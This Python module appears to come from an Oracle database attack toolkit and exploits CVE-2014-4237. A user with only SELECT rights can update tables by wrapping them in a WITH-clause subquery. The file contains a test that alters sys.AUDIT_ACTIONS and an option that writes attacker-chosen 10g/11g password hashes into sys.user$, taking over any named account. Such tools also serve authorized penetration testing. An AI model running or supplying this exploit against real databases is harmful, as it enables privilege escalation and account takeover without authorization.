import logging
from OracleDatabase import OracleDatabase
from Constants import *
from Utils import checkOptionsGivenByTheUser
from passlib.hash import oracle11 as oracle11
from passlib.hash import oracle10 as oracle10


class CVE_XXXX_YYYY (OracleDatabase):
	'''
	CVE-2014-4237 ? : A user authenticated can modify all tables who can select even if he can't modify them normally (no ALTER privilege)
	'''


	def __init__(self, args):
		'''
		Constructor
		'''
		logging.debug("CVE_XXXX_YYYY object created")
		OracleDatabase.__init__(self,args)
		self.args=args
		
	####################################################################################################################
	#											CVE_2014_4237
	#
	# A user authenticated can modify all tables who can select even if he can't modify them 
	# normally (no ALTER privilege on them)
	# https://twitter.com/gokhanatil/status/595853921479991297
	####################################################################################################################
	def exploit_CVE_2014_4237 (self, updateRequestNormal, updateRequestWithView):
		'''
		Returns:
		- True: current user can exploit this CVE
		- False: current user can not exploit this CVE
		- None: impossible to known if vulnerable
		'''
		logging.info("Try to exploit the CVE-2014-4237 for doing this operation: {0}".format(updateRequestNormal))
		status = self.__execPLSQL__(updateRequestNormal)
		if isinstance(status, Exception):
			logging.info("The current user can NOT modify the table with a simple update request. It is a good news for testing if vulnerable!")
			logging.info('Testing if CVE-2014-4237 can be exploited by current user using the following SQL request: {0}'.format(updateRequestWithView))
			status = self.__execPLSQL__(updateRequestWithView)
			if isinstance(status, Exception):
				logging.info("Impossible to modify the table (not vulnerable to CVE-2014-4237): {0}".format(self.cleanError(status)))
				return False
			else : 
				logging.info("The current user can alter the table. Vulnerable to CVE-2014-4237.")
				return True
		else :
			logging.info("The current user can modify the table with a simple update request. Bad news for testing if vulnerable!")
			return None
		
	####################################################################################################################
	#											ALL FUNCTION
	####################################################################################################################
		
	def testAll (self):
		'''
		Test all CVE
		'''
		REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237 = "update (with tmp as (select * from sys.AUDIT_ACTIONS) select * from tmp) set name='UNKNOWN' where action=0"
		REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237 = "update sys.AUDIT_ACTIONS set name='UNKNOWN' where action=0"
		self.args['print'].subtitle("Modify any table while/when he can select it only normally (CVE-2014-4237)?")
		status = self.exploit_CVE_2014_4237(updateRequestNormal=REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237, updateRequestWithView=REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237)
		if status == True:
			logging.info("The current user can modify the table sys.AUDIT_ACTIONS for example while he can't modify it normally (no alter privilege)")
			self.args['print'].goodNews("OK")
		elif status == False:
			logging.info("The current user can't exploit this CVE")
			self.args['print'].badNews("KO")
		else:
			logging.info("Impossible to know if this database is vulnerable to this CVE because current user is too privileged")
			self.args['print'].unknownNews("Impossible to know")
			
		
		
def runCVEXXXYYYModule(args):
	'''
	Run the CVE_XXXX_YYYY module
	'''
	if checkOptionsGivenByTheUser(args,["test-module","set-pwd-2014-4237"],checkAccount=False) == False : return EXIT_MISS_ARGUMENT
	cve = CVE_XXXX_YYYY(args)
	status = cve.connection(stopIfError=True)
	if args['test-module'] == True :
		cve.testAll()
	if args['set-pwd-2014-4237'] != None :
		hash11g = oracle11.encrypt(args['set-pwd-2014-4237'][1])
		hash10g = oracle10.encrypt(args['set-pwd-2014-4237'][1], user=args['set-pwd-2014-4237'][0])
		logging.info("hash11g('{2}')={0} & hash10g('{2}')={1}".format(hash11g, hash10g, args['set-pwd-2014-4237'][0]))
		REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237 = "update (with tmp as (select * from sys.user$) select * from tmp) set password='{1}', SPARE4='{2}' where name='{0}'".format(args['set-pwd-2014-4237'][0], hash10g, hash11g)
		REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237 = "update sys.user$ set password='{1}', SPARE4='{2}' where name='{0}'".format(args['set-pwd-2014-4237'][0], hash10g, hash11g)
		args['print'].title("Modify password of '{0}' by these hashs '{1}' & '{2}' using CVE-2014-4237".format(args['set-pwd-2014-4237'][0],hash10g, hash11g))
		status = cve.exploit_CVE_2014_4237(updateRequestNormal=REQ_ALTER_AUDIT_ACTIONS_FOR_CVE_2014_4237, updateRequestWithView=REQ_ALTER_AUDIT_ACTIONS_WITH_VIEW_FOR_CVE_2014_4237)
		if status == True:
			cve.args['print'].goodNews("The password of '{0}' has been replaced by '{1}' by exploiting CVE-2014-4237. DB restart necessary!".format(args['set-pwd-2014-4237'][0],args['set-pwd-2014-4237'][1]))
		elif status == False:
			cve.args['print'].badNews("The password of '{0}' has NOT been replaced".format(args['set-pwd-2014-4237'][0]))
		elif status == None:
			cve.args['print'].goodNews("The password of '{0}' has been replaced. This CVE has not be used to do that (if it impacts this database). DB restart necessary!".format(args['set-pwd-2014-4237'][0]))
		
		
		
		
		
		
		
		
